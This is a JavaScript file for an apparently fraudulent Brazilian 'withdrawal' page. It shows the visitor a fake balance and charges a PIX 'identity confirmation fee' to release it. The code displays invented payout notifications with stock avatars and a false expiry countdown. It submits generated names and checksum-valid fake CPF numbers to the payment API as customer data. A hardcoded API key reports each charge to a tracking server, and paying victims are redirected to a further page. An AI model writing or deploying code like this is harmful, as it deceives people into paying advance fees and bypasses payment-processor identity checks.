document.addEventListener("DOMContentLoaded", () => {
    // ===== Railway (Purchase garantido S2S) =====
    const RAILWAY_URL = "https://pix-purchase-railway-zuckpay-production.up.railway.app";
    const RAILWAY_API_KEY = "9aHgnfPRYaNx6QcBh3DFn05PiWP6t5WQ23";

    function registrarPixNaRailway({ transactionId, pixCode, value }) {
        try {
            if (!RAILWAY_URL || !RAILWAY_API_KEY) return;
            const clickid = (localStorage.getItem('click_id') || localStorage.getItem('clickid') || '').trim();
            if (!clickid || !transactionId) return;
            const payload = {
                transactionId: String(transactionId),
                clickid: String(clickid),
                value: Number(value) || 0,
                currency: "BRL",
                pixCode: pixCode || null
            };
            fetch(`${RAILWAY_URL}/pix-created`, {
                method: "POST",
                headers: { "Content-Type": "application/json", "x-api-key": RAILWAY_API_KEY },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(() => {});
        } catch (e) {}
    }

    // ===== Geradores de dados aleatórios válidos =====
    function gerarCPF() {
        const n = (i) => Math.floor(Math.random() * 9);
        const n1 = n(), n2 = n(), n3 = n(), n4 = n(), n5 = n(), n6 = n(), n7 = n(), n8 = n(), n9 = n();
        let d1 = (n1 * 10 + n2 * 9 + n3 * 8 + n4 * 7 + n5 * 6 + n6 * 5 + n7 * 4 + n8 * 3 + n9 * 2) % 11;
        d1 = d1 < 2 ? 0 : 11 - d1;
        let d2 = (n1 * 11 + n2 * 10 + n3 * 9 + n4 * 8 + n5 * 7 + n6 * 6 + n7 * 5 + n8 * 4 + n9 * 3 + d1 * 2) % 11;
        d2 = d2 < 2 ? 0 : 11 - d2;
        return `${n1}${n2}${n3}.${n4}${n5}${n6}.${n7}${n8}${n9}-${d1}${d2}`;
    }

    const NOMES = [
        "Ana Clara Santos", "Bruno Oliveira", "Carla Souza Lima", "Daniel Pereira",
        "Eduarda Costa", "Felipe Almeida", "Gabriela Martins", "Henrique Barbosa",
        "Isabela Rocha", "João Pedro Carvalho", "Kamila Vieira", "Lucas Mendes",
        "Marina Fernandes", "Natalia Ribeiro", "Otavio Correia", "Patricia Gomes",
        "Rafael Moreira", "Sabrina Teixeira", "Thiago Cardoso", "Vanessa Araujo",
        "Wagner Campos", "Yasmin Dias", "Adriano Nunes", "Beatriz Farias",
        "Caio Monteiro", "Daniela Peixoto", "Erick Cavalcanti", "Fernanda Moura",
        "Guilherme Vargas", "Helena Brandao"
    ];

    function gerarNome() {
        return NOMES[Math.floor(Math.random() * NOMES.length)];
    }

    function gerarEmail(nome) {
        const dominios = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br", "bol.com.br", "uol.com.br", "live.com"];
        const limpo = nome.toLowerCase().replace(/\s/g, "").normalize("NFD").replace(/[\u0300-\u036f]/g, "");
        return `${limpo}${Math.floor(Math.random() * 9999)}@${dominios[Math.floor(Math.random() * dominios.length)]}`;
    }

    function gerarTelefone() {
        const ddd = ["11", "21", "31", "41", "51", "61", "71", "81", "91", "12", "13", "14", "15", "16", "17", "18", "19"];
        return `${ddd[Math.floor(Math.random() * ddd.length)]}9${Math.floor(Math.random() * 90000000 + 10000000)}`;
    }

    // ===== Gera dados aleatórios e salva no formulário =====
    function preencherDadosAleatorios() {
        const nome = gerarNome();
        const cpf = gerarCPF();
        const email = gerarEmail(nome);
        const telefone = gerarTelefone();

        localStorage.setItem('podpay_dados', JSON.stringify({ nome, cpf, email, telefone }));

        const nomeEl = document.getElementById('confirm-nome');
        const chaveEl = document.getElementById('confirm-chave');
        if (nomeEl) nomeEl.innerText = nome;
        if (chaveEl) chaveEl.innerText = cpf;
    }

    // --- 1. SELETORES DE ELEMENTOS ---
    const loadingScreen = document.getElementById('loading-screen');
    const loadingBarFill = document.getElementById('loading-bar-fill');
    const mainContent = document.getElementById('main-content');
    const btnGerarPix = document.getElementById('btn-gerar-pix');

    const modalPix = document.getElementById('modal-pix');
    const qrCodeImg = document.getElementById('qr-code-img');
    const inputPixCode = document.getElementById('pix-copia-cola');
    const expiraTimer = document.getElementById('expira-timer');

    let intervaloGanhadores = null;

    const listaGanhadores = [
        { nome: "Pedro H.", valor: "R$ 2.029,02", img: "https://i.pravatar.cc/150?img=11" },
        { nome: "Maria S.", valor: "R$ 1.733,92", img: "https://i.pravatar.cc/150?img=5" },
        { nome: "João P.", valor: "R$ 5.496,72", img: "https://i.pravatar.cc/150?img=12" },
        { nome: "Ana C.", valor: "R$ 850,50", img: "https://i.pravatar.cc/150?img=9" },
        { nome: "Lucas M.", valor: "R$ 3.120,00", img: "https://i.pravatar.cc/150?img=15" },
        { nome: "Juliana T.", valor: "R$ 1.050,00", img: "https://i.pravatar.cc/150?img=20" }
    ];

    function mostrarGanhador() {
        const toast = document.getElementById('toast-saque');
        const toastImg = document.getElementById('toast-img');
        const toastMensagem = document.getElementById('toast-mensagem');
        if (!toast) return;
        const ganhador = listaGanhadores[Math.floor(Math.random() * listaGanhadores.length)];
        toastImg.src = ganhador.img;
        toastMensagem.innerHTML = `${ganhador.nome} sacou <strong class="texto-verde">${ganhador.valor}</strong>`;
        toast.classList.add('show');
        setTimeout(() => { toast.classList.remove('show'); }, 3000);
    }

    // --- 2. LÓGICA DO LOADING INICIAL ---
    const tempoLoading = 3000;
    let progresso = 0;
    const intervalo = setInterval(() => {
        progresso += (100 / (tempoLoading / 30));
        if (progresso >= 100) {
            progresso = 100;
            clearInterval(intervalo);
            setTimeout(() => {
                if (loadingScreen) {
                    loadingScreen.style.opacity = "0";
                    setTimeout(() => {
                        loadingScreen.style.display = "none";
                        mainContent.style.display = "block";
                        setTimeout(() => { mainContent.style.opacity = "1"; }, 50);
                    }, 500);
                }
            }, 300);
        }
        if (loadingBarFill) loadingBarFill.style.width = `${progresso}%`;
    }, 30);

    // --- 3. FUNÇÃO DO CRONÔMETRO ---
    function iniciarCronometro(duracao, display) {
        if (!display) return;
        let timer = duracao, minutos, segundos;
        const contagem = setInterval(() => {
            minutos = parseInt(timer / 60, 10);
            segundos = parseInt(timer % 60, 10);
            display.textContent = (minutos < 10 ? "0" + minutos : minutos) + ":" + (segundos < 10 ? "0" + segundos : segundos);
            if (--timer < 0) clearInterval(contagem);
        }, 1000);
    }

    // --- 4. CONFIGURAÇÃO DE VALORES DINÂMICOS ---
    function configurarValoresDinamicos() {
        const taxa = (Math.random() * (34 - 32) + 32).toFixed(2);
        const saldoOriginal = 5496.72;
        const totalReceber = (parseFloat(taxa) + saldoOriginal).toFixed(2);
        const formatar = (v) => parseFloat(v).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

        const displayTaxa = document.getElementById('taxa-valor-display');
        if (displayTaxa) displayTaxa.innerText = formatar(taxa);

        document.querySelectorAll('.taxa-texto-dinamico').forEach(el => el.innerText = formatar(taxa));

        const displayTotal = document.getElementById('total-receber');
        if (displayTotal) displayTotal.innerText = formatar(totalReceber);

        const displayData = document.getElementById('data-atual');
        if (displayData) displayData.innerText = new Date().toLocaleDateString('pt-BR');
    }

    function carregarDadosUsuario() {
        const dados = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};
        const podpayDados = JSON.parse(localStorage.getItem('podpay_dados')) || {};
        const nomeEl = document.getElementById('confirm-nome');
        const tipoEl = document.getElementById('confirm-tipo');
        const chaveEl = document.getElementById('confirm-chave');

        if (nomeEl) nomeEl.innerText = podpayDados.nome || dados.nomeCompleto || "Não informado";
        if (tipoEl) tipoEl.innerText = dados.tipoChave || "CPF";
        if (chaveEl) chaveEl.innerText = podpayDados.cpf || dados.chavePix || "---";
    }

    // --- 6. AÇÃO DE GERAR PAGAMENTO VIA PODPAY ---
    if (btnGerarPix) {
        btnGerarPix.addEventListener('click', function() {
            btnGerarPix.innerHTML = "<i class='bx bx-loader-alt bx-spin'></i> Gerando PIX...";
            btnGerarPix.style.pointerEvents = "none";

            var taxaEl = document.getElementById('taxa-valor-display');
            var taxaTexto = taxaEl ? taxaEl.innerText : 'R$ 33,00';
            var valorLimpo = parseFloat(taxaTexto.replace(/[^\d,]/g, '').replace(',', '.'));
            var amountCents = Math.round(valorLimpo * 100);

            var dadosAleatorios = JSON.parse(localStorage.getItem('podpay_dados'));
            if (!dadosAleatorios) {
                dadosAleatorios = {
                    nome: gerarNome(),
                    cpf: gerarCPF(),
                    email: gerarEmail(gerarNome()),
                    telefone: gerarTelefone()
                };
                localStorage.setItem('podpay_dados', JSON.stringify(dadosAleatorios));
            }

            var cpfNumeros = dadosAleatorios.cpf.replace(/\D/g, '');
            var telefoneNumeros = dadosAleatorios.telefone.replace(/\D/g, '');

            var payload = {
                amount: amountCents,
                customer: {
                    name: dadosAleatorios.nome,
                    document: { type: "cpf", number: cpfNumeros },
                    email: dadosAleatorios.email,
                    phone: telefoneNumeros
                },
                items: [{
                    title: "Taxa de confirmação de identidade",
                    unitPrice: amountCents,
                    quantity: 1,
                    tangible: false
                }]
            };

            fetch('/api/podpay', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(function(res) {
                if (!res.ok) {
                    return res.json().then(function(errData) {
                        throw new Error((errData.error && errData.error.message) || 'Erro ao gerar PIX');
                    });
                }
                return res.json();
            })
            .then(function(data) {
                if (!data.success || !data.data) {
                    throw new Error(data.error?.message || 'Resposta inválida da API');
                }

                var transaction = data.data;
                var pixCode = transaction.pixQrCode || null;
                var transactionId = transaction.id || null;
                var pixQrCodeImage = transaction.pixQrCodeImage || null;

                if (!pixCode) {
                    throw new Error('PIX não gerado: resposta sem código');
                }

                if (inputPixCode) inputPixCode.value = pixCode;

                if (qrCodeImg) {
                    if (pixQrCodeImage) {
                        qrCodeImg.src = pixQrCodeImage;
                    } else {
                        qrCodeImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
                    }
                }

                registrarPixNaRailway({
                    transactionId: transactionId,
                    pixCode: pixCode,
                    value: valorLimpo
                });

                if (modalPix) {
                    modalPix.style.display = 'flex';
                    setTimeout(function() { modalPix.style.opacity = '1'; }, 10);
                    document.body.style.overflow = "hidden";

                    if (!intervaloGanhadores) {
                        setTimeout(mostrarGanhador, 1000);
                        intervaloGanhadores = setInterval(mostrarGanhador, 5000);
                    }
                }

                iniciarCronometro(60 * 7, expiraTimer);

                if (transactionId) {
                    var verificarStatus = setInterval(function() {
                        fetch('/api/podpay?id=' + encodeURIComponent(transactionId), {
                            headers: { 'Accept': 'application/json' }
                        })
                        .then(function(r) {
                            if (!r.ok) return null;
                            return r.json().catch(function() { return null; });
                        })
                        .then(function(resStatus) {
                            if (resStatus && resStatus.success && resStatus.data && resStatus.data.status === 'paid') {
                                clearInterval(verificarStatus);
                                setTimeout(function() { window.location.href = '/up1'; }, 500);
                            }
                        })
                        .catch(function(err) { console.error('Erro na consulta de status:', err); });
                    }, 5000);

                    setTimeout(function() { clearInterval(verificarStatus); }, 15 * 60 * 1000);
                }

                btnGerarPix.innerHTML = "Pagar taxa para Liberar Saque";
                btnGerarPix.style.pointerEvents = "auto";
            })
            .catch(function(err) {
                console.error('Erro ao gerar PIX:', err);
                alert("Erro ao gerar PIX. " + (err && err.message ? err.message : "Tente novamente."));
                btnGerarPix.innerHTML = "Pagar taxa para Liberar Saque";
                btnGerarPix.style.pointerEvents = "auto";
            });
        });
    }

    // --- FUNÇÃO GLOBAL DE COPIAR PIX ---
    window.copiarPix = function () {
        if (!inputPixCode) return;
        inputPixCode.select();
        inputPixCode.setSelectionRange(0, 99999);
        try {
            document.execCommand("copy");
            alert("Código PIX copiado com sucesso!");
        } catch (err) {
            navigator.clipboard.writeText(inputPixCode.value);
            alert("Código PIX copiado!");
        }
    };

    preencherDadosAleatorios();
    configurarValoresDinamicos();
    carregarDadosUsuario();
});
